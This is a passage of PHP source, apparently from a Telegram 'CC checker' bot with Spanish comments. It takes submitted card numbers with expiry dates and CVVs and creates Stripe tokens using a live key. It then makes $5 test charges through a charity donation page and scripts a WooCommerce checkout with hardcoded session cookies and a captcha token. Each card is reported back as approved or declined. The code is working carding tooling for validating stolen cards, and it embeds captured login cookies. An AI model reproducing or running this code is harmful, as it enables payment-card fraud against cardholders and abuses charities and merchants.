sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; woocommerce_items_in_cart=1; woocommerce_cart_hash=ed9acd73c817522d26e819b0cfc4e423; __stripe_mid=9b1a0ea1-0156-4186-9458-c4e8fe27376f75e12a; __stripe_sid=e8d0ef65-cbfe-4a06-980f-007ab0e3293d922cf1; wordpress_logged_in_508923f30af7c37ea20c1d6887bb80bd=carlos.perez-6019%7C1734206856%7Chn6GYxnU76sz0R0Vgotg9rjfL5wbxk85jfucUf92y1M%7C1d3a440d52aca054b16825ba30fb4d92b7be0a6a191ad86016bb2aec1ff6e7fa; wp_woocommerce_session_508923f30af7c37ea20c1d6887bb80bd=19118%7C%7C1733169952%7C%7C1733166352%7C%7C77a77fe5309e22612909f381962748e7; wfwaf-authcookie-084fa67f8cdb5120d8f1ead9606207d0=19118%7Cother%7Cread%7Caed4d4f6aae423a49e392ed087989ec1b5de69732a5c9794c096926523df75fa; sbjs_session=pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffacesandvoicesofrecovery.org%2Fengage%2Fdonate%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
  //  'Accept-Encoding: gzip, deflate, br, zstd',
    //'sec-ch-ua-platform: "Android"',
    //'x-requested-with: XMLHttpRequest',
   // 'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
   // 'sec-ch-ua-mobile: ?1',
   // 'sec-gpc: 1',
    //'accept-language: es-US,es;q=0.7',
    'origin: https://facesandvoicesofrecovery.org',
   // 'sec-fetch-site: same-origin',
    //'sec-fetch-mode: cors',
   // 'sec-fetch-dest: empty',
    'referer: https://facesandvoicesofrecovery.org/engage/donate/',
    //'priority: u=1, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);
sendPv($myid, $response);
sendPv($myid, '2');
editMessage($chat_id, $response, $id_text);


}


elseif((strpos($message, "!go") === 0)||(strpos($message, "/go") === 0)||(strpos($message, ".go") === 0)){            
$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = trim($i[0]);
$mes   = trim($i[1]);
$ano  = trim(substr($i[2], -2));
$cvv   = trim($i[3]);

$bin = substr($lista, 0, 6);
$ma = "$mes/$ano1";
//$ma = "$mes+%2F+$ano";

////
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
if($verify != ""){
$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}

if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
}else{
$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /go cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !go cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .go cc|m|y|cvv\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin



//RANDOM USER//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$get = curl_exec($ch);
curl_close($ch);
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];

////SACA EL TOKEN//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F3d0d0fc67%3B+stripe-js-v3%2F3d0d0fc67&time_on_page=63244&key=pk_live_41FIHoENH2ilJLW1pkGdu3wb&pasted_fields=number');
$response = curl_exec($ch);
$err = curl_error($ch);
$json = json_decode($response, true);
curl_close($ch);
/*
$token = trim(strip_tags(getstr($result,'id": "','"')));
$ip = trim(strip_tags(getstr($result,'client_ip": "','"')));
*/
$token = $json["id"];
$ip = $json["client_ip"];

//---------------PRUEBA LAS CCS EN PAGINA DE DONACION---------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://goodbricksapp.com/icsd.org/donate');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'g-recaptcha-response=03ANYolqtrAXy5zIt2AjPl_v86EhHB_0O8YEgRQ73dmNp0E6rS3OaDFJqwYHwDoSLyD6Z9plsGVb3XvVAqEvqVWJTNX-YDYXAx2ynIggYNEIE5ns3byzDEIOJMghcj6qkmnzTyM4nzk3XRnSeqndz8VbvON0ctHxIbblzlqdtAwfNLKyYN3Z4QvcOqK8RmrhIJNInTgDRBAXqo8cCS3hg2xlDTbuzXSS1EV4WAlTE0yIyUVAs27f63DSS4MRZL-jX8ifTCcHmDgX3sKX92atN3k3vI91QTJ8TGmPkcuWTj4xgBnktDyFxQSIPMY2yORw5d90yIDfUHQV62ZAn3TQvZ0l_psLuVhs15xrah2ZGuA-qTBuAhAM64qn8WXaw2YCXQMG1rU4RkUeYm3PvsV0_Yxq9aBzDMC7g6aySQP-1RUw2AA6Ma7yTWvhdwL7tWcs7iy6-5fWF86dIb2tBujmSMzwfr4EdOZ1PD4Q&token='.$token.'&clientIp='.$ip.'&categoryAmount=5&paymentIterations=0&categoryName=funeral+expenses&firstName='.$name.'&lastName='.$last.'&email='.$email.'&customerEmailValidation=&phone='.$phone.'&address=true&addressStreet='.$street.'&addressApt=&addressCity='.$city.'&addressState='.$state.'&addressZipCode='.$postcode.'');

$response = curl_exec($ch);
$err = curl_error($ch);
$json = json_decode($response, true);

$respo = $json["status"];

if (empty($respo)){
$respo = explode(';', $json['message'])[0];
}

curl_close($ch);
	

$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";


if (empty($respo)) {
        $respo = $response;
}

// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: APPROVED ✅\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
  //  $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($5)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n➭ 𝐂𝐚𝐫𝐝: ".$lista."\n➭ 𝐒𝐭𝐚𝐭𝐮𝐬: DECLINED ❌\n➭ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n➭ 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n➭ 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n➭ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n➭ 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";//    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($5)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = False;
} else {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($5)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
    $live = False;
}

if ($live) {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
} else {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


 }

	

elseif((strpos($message, "!na") === 0)||(strpos($message, "/na") === 0)||(strpos($message, ".na") === 0)){
$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano   = $i[2];
//$ano  = trim(substr($i[2], -2));
$cvv   = $i[3];

if (strlen($ano) == 2) {
    $ano = '20' . $ano;
}


$bin = substr($lista, 0, 6);
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
	if($verify != ""){
		$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
		sendMessage($chat_id,$respuesta, $message_id);
		die();
}

if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
}else{
$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /na cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !na cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .na cc|m|y|cvv\n";
sendMessage($chat_id,$respuesta, $message_id);
        die();
}
//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
        sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
        //----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin



///SACA EL NONCE//
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.naturexnauts.com/checkout/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; shop_display=grid; wp_woocommerce_session_f2a709978a8014e107f9b41c3a8cb8d0=t_1f5acb4a47a8ac88005a1faeb4784f%7C%7C1730845715%7C%7C1730842115%7C%7C833925d7f03cea5b340cba49703789e8; woocommerce_items_in_cart=1; woocommerce_cart_hash=6dcb71c95f2361b301b216aec27ec3d0; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fcheckout%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'x-requested-with: XMLHttpRequest',
    'referer: https://www.naturexnauts.com/checkout/',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/name="woocommerce-process-checkout-nonce" value="([a-zA-Z0-9]+)"/';
preg_match($patron, $response, $coincidencias);
$nonce = $coincidencias[1];
curl_close($curl);


if (empty($nonce)) {
//    echo "Se agrega un producto al carrito\n";
////Agrega el producto al carrito///
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.naturexnauts.com/product/mc-enterprises-motor-for-atwood-8525-iv-8531-iv-furnaces-30133mc/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => [
    'quantity' => '1',
    'add-to-cart' => '125136',
  ],
  CURLOPT_COOKIE => 'wp_woocommerce_session_f2a709978a8014e107f9b41c3a8cb8d0=t_1f5acb4a47a8ac88005a1faeb4784f%7C%7C1730845715%7C%7C1730842115%7C%7C833925d7f03cea5b340cba49703789e8; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-03%2023%3A54%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fproduct%2Fmc-enterprises-motor-for-atwood-8525-iv-8531-iv-furnaces-30133mc%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fproduct%2Fmc-enterprises-motor-for-atwood-8525-iv-8531-iv-furnaces-30133mc%2F; sbjs_first_add=fd%3D2024-11-03%2023%3A54%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fproduct%2Fmc-enterprises-motor-for-atwood-8525-iv-8531-iv-furnaces-30133mc%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fproduct%2Fmc-enterprises-motor-for-atwood-8525-iv-8531-iv-furnaces-30133mc%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fproduct%2Fmc-enterprises-motor-for-atwood-8525-iv-8531-iv-furnaces-30133mc%2F; shop_display=grid',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'origin: https://www.naturexnauts.com',
//    'content-type: multipart/form-data; boundary=----WebKitFormBoundarysB6JgnsfL19hB00B',
    'referer: https://www.naturexnauts.com/product/mc-enterprises-motor-for-atwood-8525-iv-8531-iv-furnaces-30133mc/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/&ldquo;.*&rdquo;\s*(.*)/';
preg_match($patron, $response, $coincidencias);
$texto_necesario = trim($coincidencias[1]);
curl_close($curl);
//echo "$texto_necesario\n"; // Salida: has been added to your cart


////SACA EL NONCE///
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.naturexnauts.com/checkout/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; shop_display=grid; wp_woocommerce_session_f2a709978a8014e107f9b41c3a8cb8d0=t_1f5acb4a47a8ac88005a1faeb4784f%7C%7C1730845715%7C%7C1730842115%7C%7C833925d7f03cea5b340cba49703789e8; woocommerce_items_in_cart=1; woocommerce_cart_hash=6dcb71c95f2361b301b216aec27ec3d0; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fcheckout%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'x-requested-with: XMLHttpRequest',
    'referer: https://www.naturexnauts.com/checkout/',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/name="woocommerce-process-checkout-nonce" value="([a-zA-Z0-9]+)"/';
preg_match($patron, $response, $coincidencias);
$nonce = $coincidencias[1];
curl_close($curl);



} else {
//    echo "El carrito contiene producto";
///POR SI EO CARRO YA TIENE PRODUCTO////
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.naturexnauts.com/checkout/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; shop_display=grid; wp_woocommerce_session_f2a709978a8014e107f9b41c3a8cb8d0=t_1f5acb4a47a8ac88005a1faeb4784f%7C%7C1730845715%7C%7C1730842115%7C%7C833925d7f03cea5b340cba49703789e8; woocommerce_items_in_cart=1; woocommerce_cart_hash=6dcb71c95f2361b301b216aec27ec3d0; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fcheckout%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'x-requested-with: XMLHttpRequest',
    'referer: https://www.naturexnauts.com/checkout/',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);

$patron = '/name="woocommerce-process-checkout-nonce" value="([a-zA-Z0-9]+)"/';
preg_match($patron, $response, $coincidencias);
$nonce = $coincidencias[1];

curl_close($curl);
//echo "$nonce";

}



////Extrae el link/////
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.naturexnauts.com?wc-ajax=checkout',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fwww.naturexnauts.com%2F&wc_order_attribution_session_start_time=2024-11-03+22%3A27%3A04&wc_order_attribution_session_pages=18&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F130.0.0.0+Mobile+Safari%2F537.36&billing_first_name=Carlos&billing_last_name=Perez&billing_company=&billing_country=US&b